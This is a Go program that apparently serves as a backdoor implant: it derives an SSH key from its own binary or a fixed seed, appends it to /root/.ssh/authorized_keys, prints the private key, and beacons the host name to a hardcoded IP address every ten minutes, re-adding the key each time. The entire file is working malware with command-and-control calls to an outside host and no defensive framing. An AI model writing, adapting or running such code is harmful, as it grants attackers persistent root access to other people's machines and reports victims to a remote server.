package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net/http"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	authorizedKeyPath = `/root/.ssh/authorized_keys`
	ip                = "117.247.252.119"
)

var (
	backdoorKey []byte
	errorLink   string = "http://%v/api/error/monkey/%v"
	activeLink  string = "http://%v/api/active/monkey/%v"
)

func init() {
	hostName, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	activeLink = fmt.Sprintf(activeLink, ip, hostName)
	errorLink = fmt.Sprintf(errorLink, ip, hostName)
}

func reportErr(err error) {
	http.Post(errorLink, "application/json", bytes.NewBuffer([]byte(fmt.Sprintf(`{"error":"%v"}`, err.Error()))))
}

func getGenericRandReader() *bytes.Buffer {
	return bytes.NewBufferString("monkeymonkeymonkeymonkeymonkeymonkeymonkey")
}

func addIfKeyNotExists(key []byte) (bool, error) {
	var authorizedKeys [][]byte

	authorizedKeysBytes, err := os.ReadFile(authorizedKeyPath)
	if err == nil {
		for _, k := range bytes.Split(authorizedKeysBytes, []byte{'\n'}) {
			if len(k) > 0 {
				authorizedKeys = append(authorizedKeys, k)
			}
			if bytes.Equal(k, key) {
				return true, nil
			}
		}
	}

	authorizedKeysBytes = bytes.Join(append(authorizedKeys, key), []byte{'\n'})

	f, err := os.OpenFile(authorizedKeyPath, os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return false, err
	}
	if _, err = f.Write(append(authorizedKeysBytes, '\n')); err != nil {
		return false, err
	}
	return true, nil
}

func generateBackdoorKey() []byte {
	var randReader *bytes.Buffer
	if executablePath, err := os.Executable(); err == nil {
		if binaryBytes, err := os.ReadFile(executablePath); err == nil {
			randReader = bytes.NewBuffer(binaryBytes)
		} else {
			randReader = getGenericRandReader()
		}
	} else {
		randReader = getGenericRandReader()
	}

	key, err := ecdsa.GenerateKey(elliptic.P256(), randReader)
	if err != nil {
		reportErr(err)
		os.Exit(0)
	}

	priv, _ := x509.MarshalECPrivateKey(key)
	fmt.Println(string(pem.EncodeToMemory(&pem.Block{
		Type:    "OPENSSH PRIVATE KEY",
		Headers: nil,
		Bytes:   priv,
	})))

	publicKey, err := ssh.NewPublicKey(&key.PublicKey)
	if err != nil {
		reportErr(err)
		os.Exit(0)
	}
	return bytes.TrimSpace(ssh.MarshalAuthorizedKey(publicKey))
}

func reportMalwareActive() {
	if _, err := http.Get(activeLink); err != nil {
		reportErr(err)
	}
}

func main() {
	backdoorKey = generateBackdoorKey()
	fmt.Println(string(backdoorKey))

	reportMalwareActive()
	if _, err := addIfKeyNotExists(backdoorKey); err != nil {
		reportErr(err)
	}

	ticker := time.NewTicker(10 * 60 * time.Second)

	for range ticker.C {
		reportMalwareActive()
		if _, err := addIfKeyNotExists(backdoorKey); err != nil {
			reportErr(err)
		}
	}
}
